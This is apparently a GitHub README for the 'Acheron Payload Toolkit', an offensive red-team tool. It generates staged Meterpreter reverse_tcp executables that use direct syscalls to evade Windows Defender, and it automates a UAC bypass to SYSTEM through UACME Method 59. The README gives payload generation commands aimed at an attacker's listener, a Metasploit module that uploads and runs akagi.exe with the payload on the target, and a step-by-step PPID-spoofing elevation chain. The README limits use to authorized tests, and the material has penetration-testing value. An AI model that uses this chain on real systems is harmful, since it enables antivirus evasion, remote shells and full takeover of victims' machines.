# Acheron Payload Toolkit

**Windows x64 payload generator with Acheron direct syscalls for Defender evasion + automated UAC bypass via Akagi (UACME) Method 59**

A professional red teaming toolkit for generating staged Meterpreter payloads using **Acheron direct syscalls** to evade Windows Defender, with fully automated **UAC bypass (Method 59 - Debug Object / PPID Spoofing)** via Akagi (UACME).

## Overview

Acheron Payload Toolkit combines:
- **Acheron direct syscalls** (`NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtCreateThreadEx`) for userland API hooking evasion
- **Staged Meterpreter payload** (`windows/x64/meterpreter/reverse_tcp`) - minimal shellcode (~511 bytes)
- **Akagi (UACME) Method 59** for reliable UAC bypass via Debug Object / PPID Spoofing
- **Interactive TUI** for payload generation and listener management
- **Metasploit post-exploitation module** for automated UAC bypass

## Architecture

```
┌─────────────────────┐     ┌──────────────────────┐     ┌─────────────────┐
│   Kali (Attacker)   │────▶│   Windows Target     │◀───│   Meterpreter   │
│                     │     │                      │     │   Sessions      │
│  • acherongen.sh    │     │  • C:\Temp\          │     │                 │
│  • listener_gen.sh  │     │    akagi.exe         │     │  • Session 1    │
│  • akagi.exe (UACME)│     │    payload.exe       │     │  • SYSTEM (2)   │
│  • Metasploit module│     │                      │     │                 │
└─────────────────────┘     └──────────────────────┘     └─────────────────┘
```

## Features

| Component | Description |
|-----------|-------------|
| **Direct Syscalls** | Acheron library for `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtCreateThreadEx` |
| **Staged Payload** | `windows/x64/meterpreter/reverse_tcp` (~511 bytes shellcode) |
| **Acheron EXE** | PE32+ x64, ~1.8 MB, direct syscalls for Defender evasion |
| **UAC Bypass** | Akagi (UACME) Method 59 - Debug Object / PPID Spoofing via AppInfo RPC |
| **Automation** | Single Metasploit module executes complete bypass chain |
| **TUI Interface** | Interactive menu for payload generation and listener management |
| **Meterpreter Upload** | Reliable file transfer via meterpreter `upload` command |
| **Cross-compiled** | Built on Linux (Kali) for Windows x64 |

## Installation

### Prerequisites (Kali Linux)
```bash
sudo apt update && sudo apt install -y golang-go metasploit-framework mingw-w64
```

### Install Toolkit
```bash
git clone https://github.com/hgguy/acheron-toolkit.git
cd acheron-toolkit
chmod +x installer.sh
./installer.sh
```

Installs to:
- `~/.local/share/acheron-toolkit/` - Toolkit files
- `~/.local/bin/acheron` - Global command
- `/usr/share/metasploit-framework/modules/post/windows/escalate/bypassuac_method59.rb` - Metasploit module (requires sudo)

### Akagi Binary (Required for UAC Bypass)
Place `akagi.exe` (UACME compiled binary) at `/home/giovi/akagi.exe` or set custom path via `AKAGI_PATH` option.

**Compile Akagi on Windows (Visual Studio):**
```cmd
# From UACME repo: https://github.com/hfiref0x/UACME
# Open Source/Akagi/uacme.vcxproj in Visual Studio
# Build Release x64 → akagi64.exe → rename to akagi.exe
# Copy to Kali: /home/giovi/akagi.exe
```

### Verify Installation
```bash
acheron
# or
acherongen.sh --help
```

## Usage

### 1. Generate Payload
```bash
# Interactive TUI
acheron
# Select 1 → LHOST → LPORT → Template (1=None)

# Direct command
acherongen.sh 192.168.1.100 4444 none
# Output: acheron_192.168.1.100_4444.exe (1.8 MB, PE32+ x64)
```

### 2. Start Listener (with UAC bypass auto-setup)
```bash
acheron
# Select 2 → LHOST → LPORT → y (launch msfconsole)
```
Generates `/tmp/acheron_listener_<PORT>.rc` with:
- `ExitOnSession false` (persistent listener)
- `InitialAutoRunScript` for UAC bypass alias

### 3. Execute UAC Bypass (when session received)
```bash
# In msfconsole after session received:
use post/windows/escalate/bypassuac_method59
set SESSION <session_id>
set LHOST <your_kali_ip>
set LPORT <your_port>
set AKAGI_PATH /home/giovi/akagi.exe  # optional if at default
run
```

**Fully automated:**
1. Finds existing Acheron payload
2. Renames with random name
3. Uploads `akagi.exe` + payload to `C:\Temp`
4. Executes `akagi.exe 59 C:\Temp\payload.exe` (Method 59)
5. Opens SYSTEM session

### 4. Check Dependencies
```bash
acheron
# Select 3
```

## File Structure

```
acheron-toolkit/
├── toolkit.sh              # Main TUI
├── acherongen.sh           # Payload generator
├── listener_gen.sh         # Listener .rc generator
├── akagi.exe               # UACME binary (Method 59) - user provided
├── bypassuac_method59.rb   # Metasploit post-exploitation module
├── installer.sh            # Installs to ~/.local/share/acheron-toolkit + ~/.local/bin/acheron
├── templates/              # Optional file templates (PDF, DOCX, JPG)
├── .github/workflows/test-payload.yml  # CI GitHub Actions
├── README.md
├── LICENSE
└── .gitignore
```

## UAC Bypass Details (Method 59)

**Technique**: Debug Object / PPID Spoofing via AppInfo RPC (James Forshaw / UACME)

1. Launches `winver.exe` under debug via AppInfo RPC to steal Debug Object
2. Launches `ComputerDefaults.exe` elevated under debug via AppInfo RPC
3. Attaches as debugger, captures elevated process handle on first DLL load
4. Duplicates handle with `PROCESS_ALL_ACCESS`
5. Uses `CreateProcessFromParent` with `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` to spoof PPID
6. Executes payload as child of elevated process → runs as SYSTEM

**Requirements on target:**
- Windows 7/8/10/11 (x64)
- `C:\Temp` writable (default)
- `akagi.exe` + payload in same directory

## Building from Source

### Compile Akagi (Windows → Windows x64)
```cmd
# From UACME repo: https://github.com/hfiref0x/UACME
# Open Source/Akagi/uacme.vcxproj in Visual Studio 2019+
# Configuration: Release x64
# Runtime Library: Multi-threaded (/MT)
# Additional Dependencies: ntdll.lib rpcrt4.lib advapi32.lib shlwapi.lib
# Build → akagi64.exe → rename to akagi.exe
```

### Cross-compile Payload (Linux → Windows x64)
```bash
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o payload.exe main.go
```

## GitHub Actions CI

`.github/workflows/test-payload.yml`:
- Checks out repo
- Verifies payload exists
- Tests msfvenom payload generation
- Runs static analysis on EXE

Trigger manually from Actions tab.

## Payload Details

| Property | Value |
|----------|-------|
| **Payload Type** | `windows/x64/meterpreter/reverse_tcp` (staged) |
| **Shellcode Size** | ~511 bytes |
| **EXE Size** | ~1.8 MB |
| **Format** | PE32+ x64 |
| **Evasion** | Acheron direct syscalls |
| **Compiler Flags** | `-ldflags="-s -w"` (strip symbols) |

## Troubleshooting

| Issue | Solution |
|-------|----------|
| Upload fails | Check `C:\Temp` writable, try `session.fs.dir.mkdir` |
| Module not found | `reload_all` in msfconsole |
| Akagi not found | Set `AKAGI_PATH` option or place at `/home/giovi/akagi.exe` |
| Session dies | Check `ExitOnSession false` in listener |
| No SYSTEM session | Verify `akagi.exe` on target, check AV, ensure Method 59 supported on target Windows version |

## Security Notes

- **Authorized testing only** - Use only on systems you own or have explicit permission to test
- **Staged payload** - Requires listener running BEFORE victim executes payload
- **UAC bypass** - Requires `akagi.exe` on target (`C:\Temp\akagi.exe`)
- **Listener persistence** - `ExitOnSession false` keeps handler alive
- **Method 59 limitations** - May not work on all Windows versions/patch levels

## License

MIT License - See LICENSE file

## Disclaimer

This tool is for **authorized security testing only**. Unauthorized access to computer systems is illegal. Use only on systems you own or have explicit written permission to test.

## References

- [UACME / Akagi](https://github.com/hfiref0x/UACME) - UAC bypass methods
- [Acheron](https://github.com/f1zm0/acheron) - Direct syscalls library
- [James Forshaw - UAC Bypass Research](https://tyranidslair.blogspot.com/)

---

*Acheron Payload Toolkit v1.0*